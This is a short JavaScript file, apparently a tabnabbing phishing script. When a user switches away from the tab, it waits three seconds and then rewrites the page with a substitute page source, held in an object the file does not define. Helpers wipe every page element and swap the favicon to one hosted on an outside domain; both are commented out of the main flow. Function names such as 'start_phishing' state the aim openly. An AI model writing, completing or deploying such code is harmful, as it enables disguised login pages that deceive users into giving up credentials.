/*
* nabtabtor.js
* 
* George Skouroupathis
*
*/

window.onblur = start_phishing_timeout;

function start_phishing_timeout() {
	setTimeout(start_phishing, 3000);
}

function start_phishing() {
	//clear_page_contents();
	build_page(webpage1);
	//appendFavIcon('s');
}
	
// Deletes all the current page elements to make space for the new ones
function clear_page_contents() {
	var all = document.getElementsByTagName("*");

	for (var i=0, len=all.length; i < len; i++) {
		try {
			 all[i].parentNode.removeChild(all[i]);
		} catch(e) {
			// pass
		}
	}
}

function build_page(webpage) {

	/*var parser = new DOMParser(),
	doc = parser.parseFromString(webpage.getSource, "text/xml");
	console.log(webpage.getSource);
	console.log(doc);*/
	document.write(webpage.getSource);
	document.close();
}

function appendFavIcon(webpage) {
	document.head = document.head || document.getElementsByTagName('head')[0];
	
	var link = document.createElement('link'),
	oldLink = document.getElementById('dynamic-favicon');
	link.id = 'dynamic-favicon';
	link.rel = 'shortcut icon';
	link.href = 'http://astrocamel.com/marketing-narrow_files/favico.ico';
	if (oldLink) {
		document.head.removeChild(oldLink);
	}
	document.head.appendChild(link);
 
}

function build_page_head() {
}

function build_page_body() {
}